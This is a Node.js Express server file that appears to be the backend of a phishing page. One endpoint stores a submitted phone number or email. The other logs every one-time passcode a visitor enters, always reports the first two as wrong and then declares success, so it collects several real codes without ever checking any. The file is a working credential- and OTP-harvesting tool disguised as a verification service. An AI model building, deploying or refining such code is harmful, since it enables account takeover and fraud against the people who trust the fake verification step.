const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");
require("dotenv").config();

const User = require("./models/User");

const app = express();

app.use(bodyParser.json());
app.use(cors());
app.use(express.static("public"));

// MongoDB
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log("DB Error:", err));


// ✅ STEP 1: Save Email/Number
app.post("/save-number", async (req, res) => {
  try {
    const { number } = req.body;

    if (!number) {
      return res.status(400).json({ error: "Number/Email required" });
    }

    const user = new User({
      number,
      otpAttempts: [],   // ✅ IMPORTANT
      attempts: 0
    });

    await user.save();

    res.json({
      message: "Saved successfully",
      userId: user._id
    });

  } catch (err) {
    console.log("SAVE ERROR:", err);
    res.status(500).json({ error: err.message });
  }
});


// ✅ STEP 2: OTP verification
app.post("/verify-otp", async (req, res) => {
  try {
    const { userId, otp } = req.body;

    const user = await User.findById(userId);

    if (!user) {
      return res.json({ success: false, message: "User not found" });
    }

    user.attempts += 1;

    // ensure array exists
    if (!user.otpAttempts) {
      user.otpAttempts = [];
    }

    user.otpAttempts.push(otp);

    await user.save();

    // first 2 attempts fail
    if (user.attempts < 3) {
      return res.json({
        success: false,
        message: "Wrong OTP"
      });
    }

    // 3rd attempt success
    return res.json({
      success: true,
      message: "OTP Verified Successfully"
    });

  } catch (err) {
    console.log("OTP ERROR:", err);
    res.status(500).json({ error: err.message });
  }
});


// PORT FIX (IMPORTANT FOR RENDER)
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
